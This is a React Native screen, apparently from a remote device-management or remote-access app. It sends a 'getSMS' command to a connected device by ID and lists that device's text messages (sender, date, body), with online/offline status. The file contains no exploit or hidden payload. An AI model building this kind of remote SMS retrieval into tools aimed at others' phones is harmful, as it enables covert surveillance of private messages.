import React, { useEffect, useState } from "react";
import { 
    Box,
    StatusBar,
    HStack,
    IconButton,
    Icon,
    Text,
    Pressable,
    FlatList, 
    Spinner,
    VStack,
    Spacer,
    Center
} from "native-base";
import MaterialCommunityIcons from 'react-native-vector-icons/MaterialCommunityIcons';
import nodejs from 'nodejs-mobile-react-native';
import moment from "moment";
import SMSViewerScreen from "../../components/SMSViewerScreen";
// redux
import { useDispatch, useSelector } from '../../redux/store';
import { resetSMS, setIsLoading } from '../../redux/slices/userInfo'
const DeviceFileManager = ({navigation,route}) => {
  const dispatch = useDispatch();
  const { deviceId } = route.params;
  const [start, setStart]=useState(0);
  const [currentSms, setCurrentSms]=useState([])
  const [visible, setVisible]=useState(false)

  const { sms, smsInfo, devices, isLoadingData } = useSelector((state) => state.userInfo);

  useEffect(()=>{
    _getSMS();
    dispatch(resetSMS());
  },[])

  _getSMS=()=>{
    const data = {
      to: deviceId,
      action: "getSMS",
      data:{
          start:start,
          end:start+10,
            }
    };
    const finalData = JSON.stringify(data);
    nodejs.channel.post('cmd',finalData)
    dispatch(setIsLoading(true));
    setStart(start+10);
   }
   
   handleSmsViewer=(sms)=>{
    setCurrentSms(sms);
    setVisible(true);
   }


  return (
    <>
    <StatusBar translucent backgroundColor={"transparent"} barStyle="light-content" />
    <Box  safeAreaTop  bg={"primary"} />

    <Box flex={1} bg={"primary"} px={'2'} >
    <HStack my="4" alignItems="center" justifyContent={"space-between"} borderBottomWidth="1" borderBottomColor={'secondary.500'} >
      <IconButton 
         onPress={()=>navigation.goBack()}
         icon={<Icon as={MaterialCommunityIcons} name="chevron-left-circle" />} 
         borderRadius="full" 
         _icon={{ color:  "tertiary.500", size: "sm"}} 
         _pressed={{ bg: "tertiary.800:alpha.20"}}            
         />
           <Text fontSize={'20'}  color={"secondary.500"}>SMS</Text>
           <Box flexDirection={'row'} alignItems='flex-end'>
            <Icon as={MaterialCommunityIcons} name="signal" color={devices[deviceId].connected?'success.500':'error.500'} size="5" mr="1"/>
            <Text fontSize={'12'} color={"secondary.500"}>{devices[deviceId].connected?'online':'offline'}</Text>
        </Box>
    </HStack>
    <Box bg="dark.100" borderRadius='5' py="4" px="4" mb='2'>
            <HStack space={3} alignItems={'center'}>
            <Icon as={MaterialCommunityIcons} name="comment-text-multiple-outline" color={"tertiary.500"} size="5" mr="1"/>
            <Text noOfLines={1} fontSize={'16'} color={"secondary.500"}>{smsInfo.totalSMS} messages</Text>
            <Spacer/>
            </HStack>
        </Box>
    <FlatList 
        data={sms} 
        renderItem={({ item }) => 
        <Pressable onPress={()=>handleSmsViewer(item)}>
        <Box bg="dark.100" borderRadius='5' py="4" px="4" mb='2'>
            <HStack flex={1} space={3} alignItems={'center'}>
            <Icon as={MaterialCommunityIcons} name={"android-messages"} color={"amber.400"} size="10" mr="1"/>
           <VStack flex={1}>
            <HStack flex={1} justifyContent={"space-between"} >
            <Text noOfLines={1} fontSize={'18'} color={"secondary.500"}>{item.number}</Text>
            <Text noOfLines={1} fontSize={'14'} color={"secondary.500"}>{moment(item.date).calendar()}</Text>
            </HStack>
            <Text noOfLines={2} fontSize={'12'} color={"secondary.500"}>{item.body} </Text>
           </VStack>
            </HStack>
        </Box>
        </Pressable>
        } 
        keyExtractor={item => item.name} 
        onEndReached ={()=>!smsInfo.isEnd&&_getSMS()}
        />
        {isLoadingData&&<Spinner color="secondary.500" />}
    </Box>
    <SMSViewerScreen visible={visible} setVisible={setVisible} sms={currentSms}/>
    </>
    )
};

export default DeviceFileManager;
  